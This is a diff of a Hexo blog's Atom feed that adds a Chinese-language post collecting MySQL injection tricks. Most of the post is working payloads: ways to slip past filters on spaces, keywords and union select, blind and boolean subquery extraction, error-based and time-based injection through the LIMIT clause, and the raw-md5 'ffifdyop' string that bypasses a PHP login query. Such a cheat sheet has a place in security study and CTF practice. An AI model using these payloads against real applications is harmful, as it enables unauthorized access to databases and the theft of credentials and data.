@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://alisitaweb.github.io/"/>
-  <updated>2017-09-06T13:54:40.879Z</updated>
+  <updated>2017-09-07T06:30:13.366Z</updated>
   <id>https://alisitaweb.github.io/</id>
   
   <author>
@@ -14,6 +14,52 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>MySQL 一些注入技巧</title>
+    <link href="https://alisitaweb.github.io/2017/09/07/MySQL-%E4%B8%80%E4%BA%9B%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/"/>
+    <id>https://alisitaweb.github.io/2017/09/07/MySQL-一些注入技巧/</id>
+    <published>2017-09-07T06:29:07.000Z</published>
+    <updated>2017-09-07T06:30:13.366Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="总结一下mysql中用的到的技巧"><a href="#总结一下mysql中用的到的技巧" class="headerlink" title="总结一下mysql中用的到的技巧"></a>总结一下mysql中用的到的技巧</h3><hr>
+<p><strong>常量</strong>：true，false，null，\N，current_timestamp变量：@myvar:=1</p>
+<p><strong>系统变量</strong>：@@version,@@datadir…..</p>
+<p><strong>常用函数</strong>：version(),pi()(圆周率),pow(x,y)(返回X的Y次方,char(),substring()</p>
+<p><strong>字符串生成</strong>：hex(),conv()(数字进制转换)</p>
+<p><strong>有关于字符串生成的</strong>：true=1,floor(pi())=3,ceil(pi())=4,floor(version())=5,ceil(version())=6….</p>
+<hr>
+<h3 id="过滤的绕过"><a href="#过滤的绕过" class="headerlink" title="过滤的绕过"></a>过滤的绕过</h3><p> <em>空格</em>：%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释  </p>
+<p> <em>and，or</em>：||，&amp;&amp; </p>
+<p> <em>union select</em>：<br> 利用括号，’and(true)like(false)union(select(pass)from(users))，<br> 方括号union [all|distinct] select pass from users#，  union%a0select pass from users，<br> 或者内联注释union/<em>&amp;sort=</em>/select pass from users#  </p>
+<p> <em>union</em>：子查询进行盲注and length((select pass from users having substr(pass,1,1)=’a’))  </p>
+<p> <em>having</em>：and(select substr(group_concat(pass),1,1)from users)=’a  </p>
+<p> <em>select … from(过滤代码如/SELECT\s+[A-Za-z.]+\s+FROM/i/i)</em>：<br>select [all|distinct] pass from users  select<code>table_name</code>from<code>information_schema</code> . <code>tables</code><br>select pass as alias from users  select pass aliasalias from users<br>select pass<code>alias alias</code>from users  select+pass%a0from(users)  </p>
+<p> <em>select,and,&amp;</em>：  这里就是可以利用上一篇文章中提到的false注入的方式进行绕过，具体见上文</p>
+<p> <em>不使用逗号</em>：’ and substr(data from 1 for 1) = ‘a’#</p>
+<h3 id="不同情境的注入技巧"><a href="#不同情境的注入技巧" class="headerlink" title="不同情境的注入技巧"></a>不同情境的注入技巧</h3><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p> 有时候可以利用一些逻辑语句进行注入<br> <code>if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)</code></p>
+<h4 id="Limit"><a href="#Limit" class="headerlink" title="Limit"></a>Limit</h4><p>  limit后面可以跟两个函数，PROCEDURE 和 INTO（需要写权限）<br>  利用PROCEDURE 有两种方式，基于报错和时间，参考文章<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="external">MySQL下Limit注入方法</a><br>  5.6以上好像不行了QAQ。。。。。<br>  基于报错<br>  <code>mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code></p>
+<p>  基于时间<br>  <code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></p>
+<h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p> order by 后面的数字也可以作为一个注入点，参考文章<a href="https://www.secpulse.com/archives/57197.html" target="_blank" rel="external">MySQL Order By 注入总结</a><br> 这里就不多写了</p>
+<h4 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h4><h5 id="不常用函数绕过滤"><a href="#不常用函数绕过滤" class="headerlink" title="不常用函数绕过滤"></a>不常用函数绕过滤</h5><p> <code>lpad(data,1,space(1))  // lpad(&#39;hi&#39;,4,&#39;?&#39;) = &#39;??hi&#39;</code><br> <code>rpad(data,1,space(1)) // rpad(&#39;hi&#39;,4,&#39;?&#39;) = &#39;hi??&#39;</code></p>
+<h5 id="搜索匹配类的函数"><a href="#搜索匹配类的函数" class="headerlink" title="搜索匹配类的函数"></a>搜索匹配类的函数</h5><p> <code>&#39;-if(locate(&#39;f&#39;,data),1,0)#&#39;</code><br> <code>&#39;-if(locate(&#39;fo&#39;,data)1,0)#&#39;</code><br> <code>&#39;-if(locate(&#39;foo&#39;,data),1,0)#&#39;</code><br> <code>instr()</code><br> <code>position()</code></p>
+<h5 id="使用函数进行字符串切割"><a href="#使用函数进行字符串切割" class="headerlink" title="使用函数进行字符串切割"></a>使用函数进行字符串切割</h5><p><code>length(trim(leading &#39;a&#39; from data))</code><br><code>length(replace(data,&#39;a&#39;,&#39;&#39;))</code></p>
+<h4 id="关于PHP中md5的一个姿势"><a href="#关于PHP中md5的一个姿势" class="headerlink" title="关于PHP中md5的一个姿势"></a>关于PHP中md5的一个姿势</h4><p>例如，PHP中有这么一段SQL语句<br><code>$sql = &quot;select * from admin where pass = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code><br>这里是可以注入的，关于PHP中md5函数<br>如果可选的raw_output被设置为TRUE，那么md5报文摘要将以16字节长度的原始二进制返回<br><strong>就是说找到一个字符串md5的二进制和字符编码中的某些编码对上，就会产生注入，这里贴出一个原文作者找到的字符串，ffifdyop,md5加密后对应的字符串是 <code>&#39;or&#39;&lt;trash&gt;</code></strong><br><a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" target="_blank" rel="external">原文</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;总结一下mysql中用的到的技巧&quot;&gt;&lt;a href=&quot;#总结一下mysql中用的到的技巧&quot; class=&quot;headerlink&quot; title=&quot;总结一下mysql中用的到的技巧&quot;&gt;&lt;/a&gt;总结一下mysql中用的到的技巧&lt;/h3&gt;&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;常
+    
+    </summary>
+    
+      <category term="SQL Injection" scheme="https://alisitaweb.github.io/categories/SQL-Injection/"/>
+    
+    
+      <category term="MySQL Injection" scheme="https://alisitaweb.github.io/tags/MySQL-Injection/"/>
+    
+  </entry>
   
   <entry>
     <title>MySQL False 注入姿势学习</title>
